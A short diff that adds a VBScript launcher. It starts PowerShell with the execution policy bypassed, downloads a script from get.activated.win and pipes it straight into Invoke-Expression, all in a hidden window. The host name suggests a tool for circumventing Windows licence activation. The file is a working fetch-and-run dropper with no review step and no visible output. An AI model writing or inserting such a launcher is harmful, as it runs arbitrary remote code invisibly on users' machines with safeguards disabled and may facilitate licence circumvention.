@@ -1,0 +1,3 @@
+Set objShell = CreateObject("WScript.Shell")
+strCommand = "powershell.exe -ExecutionPolicy Bypass -Command ""& { irm https://get.activated.win | iex  }"""
+objShell.Run strCommand, 0, True
